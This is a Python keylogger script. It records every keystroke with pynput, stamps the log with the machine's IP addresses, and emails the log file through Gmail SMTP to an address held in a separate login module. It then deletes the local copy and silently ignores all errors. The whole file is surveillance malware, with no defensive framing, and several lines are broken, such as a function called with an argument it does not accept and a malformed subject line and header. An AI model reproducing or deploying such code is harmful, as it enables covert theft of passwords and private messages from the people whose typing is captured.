import datetime
import socket
import requests
import os
import time
import smtplib
import threading
import loginfo

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key,Listener

pubIP = requests.get('http://api.ipify.org').text
privIP = socket.gethostbyname(socket.gethostname())
print(privIP)

subs = ['Key.Space',' ']

data = []
data.append(privIP+str(datetime.date))

old_app = ''
filestodel = []

def onkeypressed(key):
    key = str(key)
    if key in subs:
        data.append(subs[subs.index(key)+1])
    else:
        data.append(key)


def writeinfile():
    file = os.path.expanduser('~')+'/Documents/'

    filestodel.append(file)


    with open(file,'w+') as f:
        f.write(''.join(data))

def sendmail():
    count = 0

    fromaddr = loginfo.fromaddr
    frompswd = loginfo.frompswd
    toaddr = loginfo.toaddr

    min=10
    seconds = 60

    time.sleep(10)
    while True:
        if len(data)>1:
            try:
                writeinfile(count)

                subject = {privIP} + {count}

                msg = MIMEMultipart()
                msg['From'] = fromaddr
                msg['To'] = toaddr
                msg['Subject'] = subject
                body = 'test'
                msg.attach(MIMEText(body,'plain'))

                attachment = open(filestodel[0],'rb')

                filename = filestodel[0].split('/')[2]

                part = MIMEBase ('application','octet-stream')
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header('content-dispose','attachment;filename='+str(filename))
                msg.attach(part)

                text = msg.as_string()

                s = smtplib.SMTP('smtp.gmail.com', 587)
                s.ehlo()
                s.starttls()
                s.ehlo()
                s.login(fromaddr,frompswd)
                s.sendmail(fromaddr,toaddr,text)
                attachment.close()
                s.close()

                os.remove(filestodel[0])
                del data[1:]
                del data[0:]

                count+=1
            except:
                pass

if __name__=='__main__':
    t1= threading.Thread(target=sendmail)
    t1.start()

    with Listener(on_press=onkeypressed) as l:
        l.join()


